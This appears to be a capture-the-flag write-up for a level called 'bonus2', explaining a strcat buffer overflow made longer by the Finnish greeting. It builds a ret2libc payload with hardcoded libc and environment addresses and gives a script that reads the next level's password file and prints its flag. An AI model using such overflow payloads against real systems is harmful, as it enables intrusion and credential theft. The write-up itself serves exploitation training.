# Speaking in LANG's (bonus2)

This [binary](source.c) will greet the user differently base on the `LANG`
environment variable. To do anything it requires two arguments. These arguments
are copied back to back in memory. If the first one is big enough, meaning it
actually contains 40 bytes of data without any null byte, the second one is
going to be concanated to it in memory. And then both arguments are going to be
used down the line even though only the first one was to be used. This allows us
to perform a buffer overflow on the `strcat` call in the _greetuser_ function.

This call will concatenate the user input with a custom greeting that will be
more or less long depending on the language:

```shell
# run gdb on the binary
gdb ./bonus2
(gdb) p strlen("Hello ")
$1 = 6
(gdb) p strlen("Goedemiddag! ")
$2 = 13
(gdb) p strlen("Hyvää päivää ")
$3 = 18
(gdb) quit
# test with the finnish version
LANG=fi ./bonus2 "aaaaaaa" "bbbbbbb"
Hyvää päivää aaaaaaa
```

Here, the longer the better since it will allow us to overwrite more data in
memory. Now let's make this buffer overflow and see where is _greetuser_'s
return address:

```shell
# set the LANG to the value we want
(gdb) set environment LANG=fi
# run with arguments filling the entire buffers
(gdb) run `python -c 'print "a" * 40'` `python -c 'print "aaaabbbbccccddddeeeeffffgggghhhh"'`
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhh

Program received signal SIGSEGV, Segmentation fault.
0x66666565 in ?? ()
```

0x66 is the ascii code for 'e' and 0x65 for 'f'. This means that the return
address starts at the 18th byte of our second argument and that we have 10 more
bytes we can overwrite (not counting the null byte added at the end by
`strcat`). This is where the fun begins. What we're gonna do is a ret2libc like
in [level2](../level2):

| padding (18) | system (4) | exit (4)   | SHELL's address |
|--------------|------------|------------|-----------------|
| 0x616161...  | 0xb7e6b060 | 0xb7e5ebe0 | 0xbffffdc1      |

This is what the second argument looks like. For this to work we need also to
set `LANG` to "fi" and put the command we want to execute in the `SHELL` env.

Here's the script that does all that:

```shell
export SHELL="cat /home/user/bonus3/.pass"
export LANG=fi
ARG1=$(python -c 'print "a" * 40')
ARG2=$(python -c 'print "b" * 18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xbf\xff\xfd\xc1"[::-1]')
./bonus2 $ARG1 $ARG2
# outputs -> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

> The tricky part here was finding the SHELL env variable's address. For this we
> used a little helper [program](env_finder.c) which we used to get the address
> it was in function of the number of arguments and of the environment. Event
> then, the address was not exact. The result was found by trial and error based
> on the errors returned by the failing `sh` command.
